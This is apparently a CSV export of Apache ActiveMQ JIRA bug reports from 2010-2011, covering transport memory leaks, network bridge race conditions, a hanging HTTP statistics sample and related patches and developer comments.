;;;","24/Nov/10 19:40;artnaseef;My tests just finished and ran without a problem.  In addition to consistent performance throughout the test, a heapdump with VisualVM shows the LRUCache objects all stayed within their limits.

Thank you!;;;","25/Nov/10 09:03;dejanb;Thanks for confirming!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Statistics plugin sample hanging when switching to http transport protocol,AMQ-3026,12483863,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,jymen,jymen,09/Nov/10 18:24,05/Mar/11 17:20,14/Jul/23 05:43,05/Mar/11 17:20,5.4.1,,,,,5.5.0,,,Transport,,,,0,,,,,,,,,"When running using HTTP transport connector the provided sample ActiveMQ stat sample hangs on the :
MapMessage reply = (MapMessage) consumer.receive(); 

to reproduce : 
just use the activeMQ provided sample statistics plugin sample copied below :

      ActiveMQSession session = broker.getSession() ;
      Queue replyTo = session.createTemporaryQueue();
      MessageConsumer consumer = session.createConsumer(replyTo);

      Queue testQueue = session.createQueue(""TEST.FOO"");
      MessageProducer producer = session.createProducer(null);

      String queueName = ""ActiveMQ.Statistics.Destination."" + testQueue.getQueueName() ;
      Queue query = session.createQueue(queueName);

      Message msg = session.createMessage();

      producer.send(testQueue, msg) ;
      msg.setJMSReplyTo(replyTo);
      producer.send(query, msg);
      MapMessage reply = (MapMessage) consumer.receive();
      assertNotNull(reply);
      assertTrue(reply.getMapNames().hasMoreElements());

      for (Enumeration e = reply.getMapNames();e.hasMoreElements();) {
          String name = e.nextElement().toString();
          System.err.println(name + ""="" + reply.getObject(name));
      }

1) Check that it works  correclty using an ActiveMQ TCPIP based session.  ===> OK
2) just replace the ActiveMQ TCPIP based session by an HTTP transport session.  ===> KO

The sample will remain unresponsive on the : MapMessage reply = (MapMessage) consumer.receive(); instruction then.


",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3202,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,46500,,,Sat Mar 05 17:20:49 UTC 2011,,,,,,,,,,,"0|i0ak9r:",59557,,,,,,,,,,,,,,,,,,,,,"05/Mar/11 17:20;tabish;Root cause is the stats plugin sending an empty map message.;;;","05/Mar/11 17:20;tabish;Fixed by AMQ-3202;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ child instances create their PID file in the parent's data directory and refer to the parent's configuration files when started,AMQ-3025,12483858,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,lintongalloway,lintongalloway,09/Nov/10 08:19,09/Nov/10 08:33,14/Jul/23 05:43,09/Nov/10 08:33,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,"ActiveMQ child instances create their PID file in the parent's data directory and refer to the parent's configuration files when started. 

Please see below for the diff of the bin/activemq script:

87a88,91
> if [ -z ""$ACTIVEMQ_BASE"" ] ; then
>   ACTIVEMQ_BASE=""$ACTIVEMQ_HOME""
> fi
> 
89c93
< ACTIVEMQ_CONFIG_DIR=""$ACTIVEMQ_HOME/conf""
---
> ACTIVEMQ_CONFIG_DIR=""$ACTIVEMQ_BASE/conf""
93c97
<   ACTIVEMQ_DATA_DIR=""$ACTIVEMQ_HOME/data""
---
>   ACTIVEMQ_DATA_DIR=""$ACTIVEMQ_BASE/data""
283,286d286
< 
< if [ -z ""$ACTIVEMQ_BASE"" ] ; then
<   ACTIVEMQ_BASE=""$ACTIVEMQ_HOME""
< fi
",unix,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74747,,,Tue Nov 09 08:33:03 UTC 2010,,,,,,,Patch Available,,,,"0|i0rplj:",159791,,,,,,,,,,,,,,,,,,,,,"09/Nov/10 08:33;lintongalloway;This one appears to be fixed against the trunk and should be available in the next release.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DestinationView.browseMessages(String) must not call OpenTypeSupport.convert(),AMQ-3023,12483861,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mwc_tonesoft,mwc_tonesoft,09/Nov/10 01:21,20/Sep/11 10:42,14/Jul/23 05:43,12/Jul/11 19:11,5.3.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Method DestinationView.browseMessages(String) should return a homogeneous List of Message(s). Therefore, line 196 of DestinationView.java must not call OpenTypeSupport.convert(), and should be changed:

From:
{quote}
    answer.add(OpenTypeSupport.convert(message));
{quote}
To:
{quote}
    answer.add(message);
{quote}
Just like line 200 that follows.",ActiveMQ 5.3.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60068,,,Tue Jul 12 19:11:14 UTC 2011,,,,,,,,,,,"0|i0ak9z:",59558,,,,,,,,,,,,,,,,,,,,,"12/Jul/11 19:11;tabish;Fixed in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"HttpTunnelServlet leaks BlockingQueueTransport objects, causing eventual OOM on heap space",AMQ-3021,12483840,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,stirlingc,stirlingc,05/Nov/10 23:03,08/Nov/10 18:09,14/Jul/23 05:43,08/Nov/10 18:09,5.4.1,,,,,5.4.2,,,Broker,Transport,,,0,,,,,,,,,"Symptom
========
We have a production system involving a network of 8 Brokers connected over HTTP.  The Brokers discover each other using SimpleDiscoveryAgent.  Our network experienced a period of instability during which time numerous Broker-to-Broker bridges were created and failed repeatedly.  Over the course of about 7 hours, two of the Brokers crashed with OOM heap space errors.

We analyzed the heap dump and discovered several thousand instances of org.apache.activemq.transport.http.BlockingQueueTransport.  These transports were associated with bridges that had failed, however, they were not being garbage collected because HttpTunnelServlet was maintaining references to them.

This issue was easily replicated in a test environment were we repeatedly broke the connection between a pair of Brokers connected over HTTP.  In each case, both Brokers maintained *indefinitely* a number of instances of BlockingQueueTransport equal to the number of times the network was interrupted.

Cause
=====
When a bridge is first created over HTTP, the client broker's HttpClientTransport sends a HEAD command to the server broker, which is processed by an instance of HttpTunnelServlet.  In response,e HttpTunnelServlet creates an instance of BlockingQueueTransport to represent the connection to the client broker.  This instance of BlockingQueueTransport is stored in a private hash map managed by HttpTunnelServlet and indexed by the client's unique ID:

public class HttpTunnelServlet extends HttpServlet {
...
    private final Map<String, BlockingQueueTransport> clients = new HashMap<String, BlockingQueueTransport>();
...

    protected BlockingQueueTransport createTransportChannel(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String clientID = request.getHeader(""clientID"");
...
            answer = createTransportChannel();
            clients.put(clientID, answer);
...

Every time a client broker reestablishes a bridge, it generates a new clientID.  As a result, the clients hash map accumulates instances of BlockingQueueTransport, one for each bridge created.  Nowhere in the implementation of HttpTunnelServlet is there any code that removes the instance when a client broker is no longer connected.  In an environment with multiple brokers and an unreliable network, the client hash  map can accumulate thousands of instances of BlockingQueueTransport.

Solution
=======
HttpTunnelServlet needs to remove an instance of BlockingQueueTransport from the clients hash map whenever that instance is no longer being used.  The addition of InactivityMonitor as a default interceptor for the BlockingQueueTransport (see AMQ-2764) is a partial solution in that it triggers the closure of unused BlockingQueueTransport instances; however, HttpTunnelServlet does not detect these closures.

The solution is included a patch and involves the following changes to HttpTunnelServlet (not all changes are directly related to the OOM):
1) The addition of a ServiceListener to the BlockingQueueTransport, which is triggered when the transport is closed and causes the removal of the transport from the clients hash map
2) Refactoring of the access to the clients hash map to simplify thread safety (in particularly, removal of explicit synchronization in lieue of ConcurrentHashMap)
3) An additional check on the BlockingQueueTransport to ensure that it was not prematurely closed (the previous code ignored this possibility)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Nov/10 23:19;stirlingc;BlockingQueueTransport.java;https://issues.apache.org/jira/secure/attachment/12461850/BlockingQueueTransport.java","05/Nov/10 23:19;stirlingc;BlockingQueueTransportLeakTest.java;https://issues.apache.org/jira/secure/attachment/12461851/BlockingQueueTransportLeakTest.java","05/Nov/10 23:18;stirlingc;patch.txt;https://issues.apache.org/jira/secure/attachment/12461849/patch.txt",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14746,,,Mon Nov 08 18:09:08 UTC 2010,,,,,,,Patch Available,,,,"0|i0b9xb:",63720,,,,,,,,,,,,,,,,,,,,,"05/Nov/10 23:18;stirlingc;Patch for HttpTunnelServlet.java;;;","05/Nov/10 23:19;stirlingc;A unit test (requires slightly modified BlockingQueueTransport) that demonstrates the leak.  The unit test fails with unpatched HttpTunnelServlet.;;;","08/Nov/10 10:49;dejanb;Committed with svn revision 1032539. Thanks for the patch!;;;","08/Nov/10 16:52;stirlingc;Dejan, the addition of the CountdownLatch to BlockingQueueTransport should not be checked in --- it was only there to demonstrate the issue through the unit test.  In its present state, a NullPointerException is likely to occur at runtime because the finalize() method will be triggered, but finalizeLatch will not have been initialized.

If you want to include the unit test, the existing code will need to be changed to use a different technique for determining the leaking BlockingQueueTransport.  Somehow you'll need access to the instance of HttpTunnelServlet, publically expose the clients hashmap, and then assert against the number of elements in the hashmap.

Unfortunately, the HttpTunnelServlet/BlockingQueueTransport class structure was not set up to support this kind of unit test, so unless you know a way to determine the number of instances of a class that are loaded in the heap, you'll have to add some testing specific code, which seems rather invasive.

======

To summarize, the patch that I submitted should be applied, and it should only affect HttpTunnelServlet.  BlockingQueueTransport should be left as-is and the unit test should not be checked in.;;;","08/Nov/10 18:09;dejanb;Removed unnecessary stuff. Thanks. Would be good to have a test to protect this in the future though!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Message is lost while browsing composite queues over the network,AMQ-3020,12483517,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,05/Nov/10 14:56,08/Nov/10 17:52,14/Jul/23 05:43,08/Nov/10 17:52,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14750,,,Mon Nov 08 17:52:36 UTC 2010,,,,,,,,,,,"0|i0b9x3:",63719,,,,,,,,,,,,,,,,,,,,,"08/Nov/10 17:52;dejanb;Fixed with svn revision 1032647

The problem is that browsers are propagated through the network and with a full-mesh configuration and statically included destination, that could lead to duplicate message delivery attempts. Those attempts are rejected by the kahadb store (with ""Duplicate message add attempt rejected."", and store and cursor goes out of the sync).

The solution is to suppress propagation of browser subscriptions over the network as they generally doesn't make much sense.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Race condition in DemandForwardingBridgeSupport can cause remote connection to be leaked.,AMQ-3016,12483820,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,stirlingc,stirlingc,04/Nov/10 20:01,06/Nov/12 21:50,14/Jul/23 05:43,06/Nov/12 21:50,5.4.1,,,,,5.8.0,,,Connector,Transport,,,0,,,,,,,,,"Symptom
========
I set up two Brokers and a network bridge from Broker A to Broker B over HTTP.  When the bridge is established, each Broker has a single transport connection (VM on broker A and HTTP on broker B) as recorded in RegionBroker.connections

I noticed that when Broker A was stopped (normally), periodically the HTTP connection would remain in Broker B's RegionBroker.connections until the InactivityMonitor on the connection timed out.  If the InactivityMonitor was disbled, then the connection would remain indefinitely.  

If Broker A was restarted, the bridge would be restarted and a second connection would be recorded in Broker B's RegionBroker.connections.  Repeating restarts of Broker A would cause an accumulation of ""dead"" connections, which would eventually lead to an OOM.

Cause
=====
When Broker A is stopped, DemandForwardingBridgeSupport.stop() is called and sends a ShutdownInfo command to the local and remote transports.  When the transports receive the ShutdownInfo, they remove the connection from their associated RegionBroker.connections as part of  TransportConnection.processRemoveConnection(ConnectionId, long):

    public synchronized Response processRemoveConnection(ConnectionId id, long lastDeliveredSequenceId)
            throws InterruptedException {
...
            try {
                broker.removeConnection(cs.getContext(), cs.getInfo(), null);
            } catch (Throwable e) {
                SERVICELOG.warn(""Failed to remove connection "" + cs.getInfo(), e);
            }

In the cases were Broker B would not clean up its connection, I traced the code and discovered that the ShutdownInfo message was not being sent because the remote transport (HttpClientTransport) had already had its ""stopped"" flag set to true as part of HttpClientTransport.oneway(Object command):

    public void oneway(Object command) throws IOException {

        if (isStopped()) {
            throw new IOException(""stopped."");
        }
...

DemandForwardingBridgeSupport's stop() method has the following code:

    public void stop() throws Exception {
...
                    ASYNC_TASKS.execute(new Runnable() {
                        public void run() {
                            try {
                                localBroker.oneway(new ShutdownInfo());
                                sendShutdown.countDown();
                                remoteBroker.oneway(new ShutdownInfo());
                            } catch (Throwable e) {
                                LOG.debug(""Caught exception sending shutdown"", e);
                            } finally {
                                sendShutdown.countDown();
                            }
                        }
                    });
                    if (!sendShutdown.await(10, TimeUnit.SECONDS)) {
                        LOG.info(""Network Could not shutdown in a timely manner"");
                    }
                } finally {
                    ServiceStopper ss = new ServiceStopper();
                    ss.stop(remoteBroker);
                    ss.stop(localBroker);
                    // Release the started Latch since another thread could be
                    // stuck waiting for it to start up.
                    startedLatch.countDown();
                    startedLatch.countDown();
                    localStartedLatch.countDown();
                    ss.throwFirstException();
                }
            }

ShutdownInfo is sent asynchronously to the local and remote transports by a slave thread:

                                localBroker.oneway(new ShutdownInfo());
                                sendShutdown.countDown();
                                remoteBroker.oneway(new ShutdownInfo());

The sendShutdown  latch is used by the master thread to prevent running the finally clause until the ShutdownInfo has been sent:

                    if (!sendShutdown.await(10, TimeUnit.SECONDS)) {
                        LOG.info(""Network Could not shutdown in a timely manner"");
                    }
                } finally {
                    ServiceStopper ss = new ServiceStopper();
                    ss.stop(remoteBroker);
                    ss.stop(localBroker);
...
                }
            }

However, because the latch is countdown *before* remoteTransport.oneway(new ShutdownInfo()) there is a race condition and in most cases the main thread calls ss.stop(remoteBroker) before the slave thread has completed its call to remoteTransport.oneway(new ShutdownInfo()).  As a result, the remoteTransport appears already stopped and the ShutdownInfo is discarded.  This leaves the connection dangling on the remote broker until the InactivityMonitor closes it.

Solution
======
The sendShutdown latch should be countdown *after* remoteTransport.oneway(new ShutdownInfo()).
",,eric-awl,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-1855,,,,,,,,,,"04/Nov/10 20:03;stirlingc;ConnectionLeakTest.java;https://issues.apache.org/jira/secure/attachment/12461830/ConnectionLeakTest.java","04/Nov/10 20:08;stirlingc;patch.txt;https://issues.apache.org/jira/secure/attachment/12461840/patch.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74748,,,Tue Nov 06 21:50:27 UTC 2012,,,,,,,Patch Available,,,,"0|i0earb:",81505,,,,,,,,,,,,,,,,,,,,,"04/Nov/10 20:03;stirlingc;This unit test exhibits the problem being reported.  In this test, a ""validation"" run is made using TCP as the bridge transport --- the race condition does not cause a leak because the remote end of the TCP connection detects the closing of the socket and cleans up the connection.  The ""failed"" run is made using HTTP as the bridge transport.  On my system, the race condition always occurs and causes the unit test to fail.  With the patch applied, both tests always succeed.;;;","04/Nov/10 20:08;stirlingc;Patch to DemandForwardingBridgeSupport which removes the premature call to sendShutdown.countDown.  countDown is already called by the finally clause.;;;","04/Nov/10 20:13;stirlingc;Checkin for r808890 added the extra call to sendShutdown.countDown();;;","05/Nov/10 08:25;eric-awl;Hi

Since duplex connections are very different from non-duplex one, this patch must be carefully test in all conditions. 
Did you launch all ActiveMQ Maven tests and verify that no border effects are discovered ?

Regards
Eric-AWL;;;","06/Nov/12 21:50;tabish;Noticed this also while doing some work in the bridging code.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Javascript client does not establish session properly.,AMQ-3015,12483850,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,pschwamb,pschwamb,04/Nov/10 15:23,10/Dec/10 15:58,14/Jul/23 05:43,10/Dec/10 15:58,5.4.1,,,,,5.5.0,,,,,,,0,,,,,,,,,"In some configurations, the javascript client (amq.js) is not loaded from the same container that hosts the activemq broker.  For example, we have a Rails app and ActiveMQ both sitting behind apache, and the amq.js file is served directly by apache.

In these kinds of configurations, when the javascript client first calls amq.init(), there is no JSESSIONID.  Both the POST to establish the subscription and the GET to start polling are delivered asynchronously, both without a JSESSIONID, and thus they each end up with different JSESSIONIDS, and the poll never returns any messages (as that session has no subscription).

This small patch adds support for a callback mechanism that will allow clients to sign up using a callback mechanism that ensures that the JESSIONID is established properly before attempting to make a subscription, like this:

{code:javascript:title=myclient.js|borderStyle=solid}
amq.init({ 
    uri: '/amq',
    sessionInitializedCallback: function() { 
        amq.addListener(""display"", ""topic://sensors"", onMessage);       
    } 
});
{code}

The patch is also backwards compatible, so existing code should still work (albeit with the same existing problem).",,alexdean,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Nov/10 15:47;pschwamb;amq_session.patch;https://issues.apache.org/jira/secure/attachment/12461829/amq_session.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14747,,,Fri Dec 10 15:58:00 UTC 2010,,,,,,,Patch Available,,,,"0|i0aka7:",59559,,,,,,,,,,,,,,,,,,,,,"10/Dec/10 15:58;dejanb;Fixed with svn revision 1044412. It will be available in 5.5.0 version. Sorry we missed this earlier.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DemandForwardingBridgeSupport can send BrokerInfo to remote transport before local broker ID is known.,AMQ-3014,12483853,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,stirlingc,stirlingc,03/Nov/10 22:56,30/Sep/11 19:36,14/Jul/23 05:43,30/Sep/11 19:36,5.4.1,,,,,5.6.0,,,Broker,Transport,,,0,,,,,,,,,"Symptom
========
We have a production system that involves a set of Brokers connected in a demand-forwarding Network-of-Brokers using HTTP-based bridges.  Each Broker periodically scans its list of peer brokers by iterating over RegionBroker.getPeerBrokerInfos:

    public synchronized BrokerInfo[] getPeerBrokerInfos() {
        BrokerInfo[] result = new BrokerInfo[brokerInfos.size()];
        result = brokerInfos.toArray(result);
        return result;
    }

This scanning code assumes that BrokerInfo.getBrokerId() is always non-null (since every broker should have an ID).  However, we periodically noticed that BrokerInfo.getBrokerId() returned a NULL value, which was very unexpected.

Cause
======
We analyzed the DemandForwardingBridgeSupport and noticed that when the remote bridge/transport is started, it sends the local Broker's ID:

    protected void startRemoteBridge() throws Exception {
...
                    brokerInfo.setBrokerId(this.localBrokerId);
                    remoteBroker.oneway(brokerInfo);
                }

The local Broker's ID is not initially known until it is received from the local transport and processed by DemandForwardingBridge.serviceLocalBrokerInfo(...):

    protected void serviceLocalBrokerInfo(Command command) throws InterruptedException {
        synchronized (brokerInfoMutex) {
            localBrokerId = ((BrokerInfo)command).getBrokerId();
            localBrokerPath[0] = localBrokerId;
            localBrokerIdKnownLatch.countDown();

The local Broker's ID is dispatched asynchronously when the local transport is started, as seen in TransportConnection.start():

    public void start() throws Exception {
        starting = true;
        try {
            synchronized (this) {
                if (taskRunnerFactory != null) {
                    taskRunner = taskRunnerFactory.createTaskRunner(this, ""ActiveMQ Connection Dispatcher: ""
                            + getRemoteAddress());
                } else {
                    taskRunner = null;
                }
                transport.start();
                active = true;
                dispatchAsync(connector.getBrokerInfo());

Because of the asynchronous dispatch, the remote bridge may be started before the local Broker's ID is known.  This would be particularly evident when the local broker is under load processing a lot of tasks.

We've attached a unit test that demonstrates how a slow asynchronous dispatch on the local transport can cause the remote transport to transmit a null BrokerId.

Solution
======
DemandForwardingBridgeSupport already contains a  localBrokerIdKnownLatch, so starting the remote transport should wait for this latch before accessing the local Broker's ID (see patch).

",,eric-awl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jul/11 00:59;stirlingc;NullBrokerIdTest.java;https://issues.apache.org/jira/secure/attachment/12486126/NullBrokerIdTest.java","03/Nov/10 22:59;stirlingc;NullBrokerIdTest.java;https://issues.apache.org/jira/secure/attachment/12461881/NullBrokerIdTest.java","03/Nov/10 22:57;stirlingc;patch.txt;https://issues.apache.org/jira/secure/attachment/12461880/patch.txt",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,41606,,,Fri Sep 30 19:36:05 UTC 2011,,,,,,,Patch Available,,,,"0|i0agyf:",59020,,,,,,,,,,,,,,,,,,,,,"03/Nov/10 22:57;stirlingc;Patch of DemandForwardingBridgeSupport, which waits until the local Broker's ID is known before transmitting the BrokerInfo to the remote transport.;;;","03/Nov/10 22:59;stirlingc;Unit test that demonstrates the ability of DemandForwardingBridgeSupport to transmit a null local Broker ID.  The test contains a ""normal"" case that typically succeeds because there are few delays in VMTransport.  The test also contains a ""delayed"" case that fails with the unpatched DemandForwardingBridgeSupport.  When the attached patch.txt is applied, both tests pass.;;;","09/Jul/11 21:40;tabish;Both tests seem to fail regardless of the patch being applied.;;;","11/Jul/11 19:49;stirlingc;The unit test is failing because Broker.addBroker(...) is no longer being called when the bridge processes a remote BrokerInfo command.  The test was relying on addBroker(...) to verify that the broker ID had been set.

The removal occurred in TransportConnection#processBrokerInfo(...) as part of this changeset:

Revision: 1058577
Author: gtully
Date: 6:18:14 AM, January 13, 2011
Message:
https://issues.apache.org/jira/browse/AMQ-3077 - ArraysIndexOutOfBoundsException : -32768 in ""BrokerService[xxx] Task"" thread - brokerInfo and peerBroker infro explosion problems. A peer is a oneway relationship with networks, broker infos were being accumulated in duplicate for each connector and for multiple connectors. The peer broker info was maintained for each which caused the problem marshalling. re: https://issues.apache.org/jira/browse/AMQ-2632 - the configuration is now respected so it can be selectively enabled and rebalance only occurs if we randomly choose an alternative. The nested peer broker info is not propagated in a connection control
----
Modified : /activemq/trunk/activemq-core/src/main/java/org/apache/activemq/network/DemandForwardingBridgeSupport.java
Modified : /activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/TransportConnection.java
Modified : /activemq/trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/RegionBroker.java
Modified : /activemq/trunk/activemq-core/src/main/java/org/apache/activemq/command/BrokerInfo.java
Modified : /activemq/trunk/activemq-core/src/main/java/org/apache/activemq/transport/failover/FailoverTransport.java
Modified : /activemq/trunk/activemq-core/src/test/java/org/apache/activemq/transport/failover/FailoverClusterTest.java
Modified : /activemq/trunk/activemq-core/src/test/java/org/apache/activemq/JmsMultipleBrokersTestSupport.java
Added : /activemq/trunk/activemq-core/src/test/java/org/apache/activemq/usecases/NetworkOfTwentyBrokersTest.java

;;;","12/Jul/11 00:59;stirlingc;Updated unit test that works on trunk to demonstrate the issue (pre-patch) and resolution (post patch).;;;","12/Jul/11 01:00;stirlingc;I've added a revised unit test that does not rely on Broker.addBroker(...) to demonstrate that the issue (transmitting BrokerInfo with null ID) is still present on trunk.;;;","30/Sep/11 19:36;tabish;Reviewed the code, Patch applied, thanks for the hard work on this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Problem with removing durable subscribers from the BrokerView,AMQ-3013,12483847,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,03/Nov/10 15:05,10/Dec/10 18:13,14/Jul/23 05:43,03/Nov/10 15:08,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,"There's a general problem with durable subscribers and respective mbeans. There are two methods on BrokerView:

- getDurableTopicSubscribers() - which should return only active subs
- getInactiveDurableTopicSubscribers() - which should return only inactive (offline) subs

So when we create durable topic subscriber it should be shown in active subs. When we close that session, it should go to the ""inactive"" list and finally when we unsubscribe, it should be completely removed.

Also, the web console should be show both active and ""offline"" subs in separate lists.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3081,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14759,,,Wed Nov 03 15:08:09 UTC 2010,,,,,,,,,,,"0|i0b9nr:",63677,,,,,,,,,,,,,,,,,,,,,"03/Nov/10 15:08;dejanb;Fixed with svn revision 1030490;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
